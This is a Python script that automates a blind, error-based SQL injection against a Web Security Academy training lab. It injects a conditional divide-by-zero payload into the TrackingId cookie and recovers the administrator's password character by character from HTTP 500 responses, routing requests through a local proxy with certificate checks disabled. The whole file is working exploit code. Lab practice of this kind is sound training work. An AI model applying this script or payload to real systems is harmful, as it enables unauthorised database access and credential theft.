import urllib
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}




def main():
    url="https://0ae50015048f0d2a80bf170e008500aa.web-security-academy.net/"
    password_extracted=""
    for i in range(1,21):
        print(f"Iteration : {i}")
        for j in range (32,126):
            sqlI_Payload = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{chr(j)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            encoded=urllib.parse.quote(sqlI_Payload)
            cookie={'TrackingId':'KwsIHlAorxU5Zanz'+encoded,'session':'138IxRwQGDSrgdsgNYHOM8cnz7qhtMzh'}
            r=requests.get(url,cookies=cookie,verify=False,proxies=proxies)
            if r.status_code==500:
                print(f"Added char {chr(j)} to the pass")
                password_extracted=password_extracted+chr(j)
                break
    
    print(f"Your Password is : {password_extracted}")


if __name__=="__main__":
    main()